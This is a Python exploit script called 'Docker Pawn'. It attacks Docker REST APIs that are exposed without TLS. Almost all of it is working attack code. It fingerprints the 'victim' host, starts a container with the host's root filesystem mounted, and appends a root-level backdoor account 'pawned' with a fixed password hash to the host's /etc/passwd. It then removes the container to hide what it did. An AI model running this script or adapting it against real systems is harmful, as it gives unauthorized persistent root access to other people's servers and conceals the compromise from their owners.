'''
Script: Docker Pawn

Author : Goutham Madhwaraj K B ( @barriersec.com)

Description :

This tool can be used to exploit docker REST API end points which are available without TLS and which are exposed publicly.

This Script Does the following :

>> Gathers Remote Host Information
>> uses existing alpine base image if available / pulls a new alpine image from the docker registry.
>> deploys a container with root file system mounted onto container at /rootFS
>> adds an entry with credentials "pawned/pawned" to the /etc/passwd wth root privileges .
>> cleans up the operations.

usage :
pre requisites :

>> works on python 3
>> pip3 install docker
>> pip3 install requests

>> usage :

pythonPawn.py -ip "victim host IP" [optional port. Default (2375)]

'''

import argparse
import requests
import json
import time
import docker

parser = argparse.ArgumentParser()
MandatoryArgs = parser.add_argument_group('required Arguments')
MandatoryArgs.add_argument('-ip', '--host', help='Exposed Docker REST API host.', required=True)

parser.add_argument('-p', "--port", help='(optional port) default 2375.')
args = parser.parse_args()

containerID = ""
tagToUse = "alpine:latest"
isAlp = False

if args.host is None:
    parser.print_help()
    exit()

port = "2375"
host = args.host
if args.port is not None:
    port = args.port

endpoint = "http://"+host+":"+port+"/"

#lowlevel API Client
client = docker.APIClient(base_url=endpoint)

headers = {
    'Accept': 'application/json'
}

container_headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}


def DockerInfo():
    try:
        DockerInfo = client.version()

    except (requests.exceptions.ConnectionError):
        print("unable to connect to docker endpoint!")
        exit()
    print("\n\nRemote Docker engine details:\n")
    print("Docker Engine: "+DockerInfo["Platform"]["Name"])
    print("Version : " + DockerInfo["Version"])
    print("API Version : " + DockerInfo["ApiVersion"])
    print("OS : " + DockerInfo["Os"])
    print("Arch : " + DockerInfo["Arch"])
    print("KernelVersion : " + DockerInfo["KernelVersion"])


def ListImages():
    global isAlp,tagToUse
    ImagesEndpoint = endpoint +'images/json'
    response = requests.request(method='GET', url=ImagesEndpoint, headers=headers)
    JsonResponse = json.loads(response.text)
    print("\n\n.................Available Docker Images on the remote host...................\n\n")
    if len(JsonResponse) > 0:
        if "RepoTags" in JsonResponse[0]:
            for i in range(0, len(JsonResponse)):
                if JsonResponse[i]["RepoTags"] is not None:
                    for tag in JsonResponse[i]["RepoTags"]:
                        if "alpine" in tag:
                            isAlp = True
                            tagToUse = tag
                print("Image ID: ", JsonResponse[i]["Id"])
                print("Image Repository Tags: ", JsonResponse[i]["RepoTags"])
                print("Image Label: ", JsonResponse[i]["Labels"])
                print("Image Size: ", JsonResponse[i]["Size"])
                print("<--------------------------------------------------------------->\n")


def pullAlpineImage():
    global containerID
    PullEndpoint = endpoint +"images/create"
    query = {
        "fromImage": "alpine:latest"
    }
    try:
        response = requests.request(method='POST', url=PullEndpoint,params=query,headers=headers)
        verifyImage = endpoint+'images/alpine:latest/json'
        response2 = requests.request(method='GET', url=verifyImage,headers=headers)
        JsonResp = json.loads(response2.text)
        if "message" in JsonResp:
            print("[-]Could not download the alpine image. Quitting...\n\n")
            exit()
        else:
            print("[+]Alpine image was pulled onto victim machine successfully!!.....\n\n")
    except (requests.exceptions.ConnectionError,):
        print("[-]Could not connect to the host....\n")


def DeployContainer(imageName):
    global containerID
    container_query = {
        "name": "PawnedAlpine"
    }
    container_config = '{"Cmd":["'+"/bin/sh"+'"],"DetachKeys": "ctrl-p,ctrl-q","AttachStdin": true,"AttachStdout":true,"AttachStderr": true,"Tty": true,"OpenStdin":true,"StdinOnce": true,"Image":'+'"'+imageName+'"'+','+'"Binds":[ "/:/rootFS" ]'+',"Volumes": { "/rootFS": {} }}'
    containerEndpoint = endpoint+"containers/create"
    CreateReq = requests.request(method='POST', url=containerEndpoint, params=container_query, data=container_config, headers=container_headers)
    jsonResp = json.loads(CreateReq.text)
    if "Id" in jsonResp:
        print("\n[+]..........Container Created successfully!!.....\n")
        containerID = jsonResp["Id"]
    else:
        print("[-]Error in creating container.check if container with same name is running.....Exiting.....\n")
        exit()
    print("[+}.........Deploying Container.......\n")

    containerDeployEndpoint = endpoint+"containers/"+containerID+"/start"
    container_config_deploy = '{}'
    DeployReq = requests.request(method='POST', url=containerDeployEndpoint, params=container_query, data=container_config_deploy,headers=container_headers)
    time.sleep(15)
    containerVerifyEndpoint = endpoint+"containers/"+containerID+"/json"
    print("[+]Verifying container status........\n")
    VerifyReq = requests.request(method='GET', url=containerVerifyEndpoint, headers=container_headers)
    VerifyResp = json.loads(VerifyReq.text)
    if "running" in VerifyResp["State"]["Status"]:
        print('[+]Container is in running state!!.')
    else:
        print("[-]Deploying container Failed!")
        exit()


def ExecCommand():
        global containerID
        cmdd = "echo 'pawned:$1$pawned$aAb5j/OPRqNJsUcF/z.bS/:0:0:/root:/bin/bash' >> rootFS/etc/passwd"
        ExecConfig ='{"AttachStdin": false,"AttachStdout": true,"AttachStdout": true,"DetachKeys": "ctrl-p,ctrl-q","Tty": false,"Cmd":["/bin/sh","-c",' + '"'+cmdd+'"]}'
        createExecEndpoint = endpoint + "containers/"+containerID+"/exec"
        response = requests.request(method='POST', url=createExecEndpoint, data=ExecConfig, headers=container_headers)
        jsonRespExec = json.loads(response.text)
        if "Id" in jsonRespExec:
            ExecId = jsonRespExec["Id"]
        else:
            print("[-].............Command Execution task failed......Exiting.....")
            exit()
        print("[+]................Running Exec Instance............")
        RunExecEndpoint = endpoint + "exec/"+ExecId+"/start"
        RunExecConfig = '{"Detach": false,"Tty": false}'
        response = requests.request(method='POST', url=RunExecEndpoint, data=RunExecConfig, headers=container_headers)
        if response.status_code == 200:
            print("[+]SUCCESS!! root User Added successfully.Login through SSH. <<Happy Pawning>> ")
        else:
            print("[-]Exec Command Request failed....Exiting.")
            exit()


def CleanUp():

    stopEndpoint = endpoint+"containers/"+containerID+"/stop"
    stopConfig = {}
    stopReq = requests.request(method='POST', data=stopConfig, url=stopEndpoint, headers=container_headers)
    if stopReq.status_code is not 204:
        print("[-]Could not stop the container!..Exiting..")
        exit()
    else:
        print("[+]Container Stopped Successfully!.")
    deleteEndpoint = endpoint+"containers/"+containerID
    deleteReq = requests.request("DELETE", url=deleteEndpoint)
    if deleteReq.status_code is not 204:
        print("[-]Could not remove the container!..Exiting..")
        exit()
    else:
        print("[+]Container Removed Successfully!.")



if __name__ == "__main__":

    DockerInfo()
    ListImages()
    if isAlp is True:
        print("[+]Alpine Base image is present!Using base alpine image to deploy a root FS mounted container!....")
        print("\n\n......trying to deploy container using Image: ", tagToUse)
        print(".................Deploying container with root mounted FS to /rootFS..........\n")
        DeployContainer(tagToUse)

    else:
        print("\n\n........Downloading Alpine base image.....\n\n")
        pullAlpineImage()
        print(".................Deploying container with root mounted FS to /tmp/rootFS..........\n")
        DeployContainer(tagToUse)

    print("\n\n[+]....................Adding root user 'pawned' with password 'pawned'................\n\n")
    ExecCommand()
    print("\n\n[+]........................Cleaning UP!.......................................................")
    CleanUp()
